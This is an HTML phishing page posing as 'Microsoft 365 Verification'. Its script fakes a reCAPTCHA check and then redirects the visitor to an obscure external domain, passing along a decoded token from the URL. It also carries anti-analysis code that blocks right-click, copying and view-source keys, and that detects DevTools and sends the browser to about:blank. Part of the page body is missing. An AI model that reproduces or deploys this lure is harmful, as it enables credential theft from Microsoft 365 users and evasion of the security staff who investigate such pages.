<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Microsoft 365 Verification</title>
  <style>
    body {
      background-color: #dbeaf4;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 350px;
      margin: 60px auto;
      padding: 30px;
      background-color: white;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0px 6px 15px rgba(0,0,0,0.15);
    }
    .logo {
      width: 250px;
      margin-bottom: 25px;
    }
    h2 {
      margin: 10px 0;
      font-weight: bold;
    }
    .desc {
      margin-bottom: 30px;
      color: #444;
    }
    .fake-recaptcha {
      display: inline-block;
      width: 302px;
      height: 76px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 4px;
      position: relative;
      cursor: pointer;
      margin-bottom: 20px;
      user-select: none;
    }
    .fake-checkbox {
      position: absolute;
      top: 26px;
      left: 50px;
      width: 18px;
      height: 18px;
      border: 2px solid #c1c1c1;
      background-color: #fff;
    }
    .fake-checkbox.checked {
      background-color: #3c8dbc;
      border-color: #3c8dbc;
    }
    .fake-checkbox.checked::after {
      content: '';
      position: absolute;
      left: 4px;
      top: 0px;
      width: 5px;
      height: 10px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
    }
    .recaptcha-label {
      position: absolute;
      top: 24px;
      left: 80px;
      font-size: 14px;
      color: #555;
    }
    .recaptcha-logo {
      position: absolute;
      right: 10px;
      bottom: 10px;
      width: 60px;
      opacity: 0.6;
    }
    button {
      background-color: #0078d4;
      color: white;
      border: none;
      padding: 10px 25px;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      opacity: 1;
      display: none;
      position: relative;
    }
    .spinner {
      position: absolute;
      right: 10px;
      top: 50%;
      width: 16px;
      height: 16px;
      margin-top: -8px;
      border: 2px solid #fff;
      border-top: 2px solid #0078d4;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }
    button.loading .spinner {
      display: inline-block;
    }
    .fake-recaptcha.loading .spinner {
      display: block;
    }
    .fake-recaptcha.loading .fake-checkbox,
    .fake-recaptcha.loading .recaptcha-label {
      opacity: 0.5;
      pointer-events: none;
    }
    .fake-recaptcha .spinner {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 24px;
      height: 24px;
      margin: -12px 0 0 -12px;
      border: 3px solid #ccc;
      border-top: 3px solid #888;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }

    /* overlay used when DevTools detected (keeps visual behavior intact until detection) */
    .__deterrent-overlay {
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.98);
      z-index: 999999;
      display: none;
      align-items: center;
      justify-content: center;
      color: #333;
      font-family: Arial, sans-serif;
      font-size: 16px;
      text-align: center;
      padding: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
  </style>
</head>

      <div id="checkbox" class="fake-checkbox"></div>
      <span class="recaptcha-label">I'm not a robot</span>
      <div class="spinner"></div>
      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="recaptcha-logo" alt="reCAPTCHA">

<script>
const fakeRecaptcha = document.querySelector(".fake-recaptcha");
const checkbox = document.getElementById("checkbox");
const btn = document.getElementById("submitBtn");
const targetUrl = "https://ms1clouds.flarekyjopmcbsojwezpyomboywc.delaiedgoruptx.space/f/zx0IaWxiAHk-FgKgbSb9";
let isLoading = false, isChecked = false;

function simulateCaptcha() {
  if (isLoading || isChecked) return;
  isLoading = true;
  fakeRecaptcha.classList.add("loading");
  setTimeout(() => {
    fakeRecaptcha.classList.remove("loading");
    checkbox.classList.add("checked");
    btn.style.display = "inline-block";
    isChecked = true;
    isLoading = false;
  }, 1000);
}

function cleanFragment(fragment){
  if(!fragment) return "";
  fragment = fragment.replace(/#+$/, ''); // strip trailing #
  const eqIndex = fragment.indexOf('=');
  if(eqIndex!==-1) fragment = fragment.substring(eqIndex+1);
  if(/^[A-Za-z0-9]+$/.test(fragment)) return "";
  try { return atob(fragment); } catch(e){ return decodeURIComponent(fragment); }
}

btn.addEventListener("click", () => {
  if(!isChecked) return;
  btn.disabled = true;
  btn.classList.add("loading");
  setTimeout(()=>{
    const url = window.location.href;
    const dollarIndex = url.indexOf('$');
    let cleanedFragment = "";
    if(dollarIndex!==-1){
      const rawFragment = url.substring(dollarIndex+1);
      cleanedFragment = cleanFragment(rawFragment);
    }
    let redirectUrl = targetUrl + (cleanedFragment ? ('$'+cleanedFragment) : '');
    window.location.href = redirectUrl;
  },1500);
});

/* Deterrent measures */
(function(){
  // Disable context menu & selection
  document.addEventListener('contextmenu', e=>e.preventDefault());
  document.addEventListener('selectstart', e=>e.preventDefault());
  document.addEventListener('copy', e=>e.preventDefault());

  // Block common keys
  document.addEventListener('keydown', function(e){
    if(e.key==='F12' || (e.ctrlKey && ['s','S','u','U','Shift'].includes(e.key))) e.preventDefault();
  });

  // DevTools detection (simple heuristic)
  let overlay = document.getElementById('deterrent-overlay');
  let lastWidth = window.outerWidth - window.innerWidth;
  let lastHeight = window.outerHeight - window.innerHeight;

  setInterval(()=>{
    let wDiff = window.outerWidth - window.innerWidth;
    let hDiff = window.outerHeight - window.innerHeight;
    if(Math.abs(wDiff-lastWidth)>100 || Math.abs(hDiff-lastHeight)>100){
      overlay.style.display='block';
      setTimeout(()=>window.location.href='about:blank',500);
    }
  },1000);

  // Fallback detection by devtools open (console)
  setInterval(()=>{
    const start = new Date();
    debugger;
    if(new Date()-start>100){
      overlay.style.display='block';
      setTimeout(()=>window.location.href='about:blank',500);
    }
  },2000);
})();
</script>
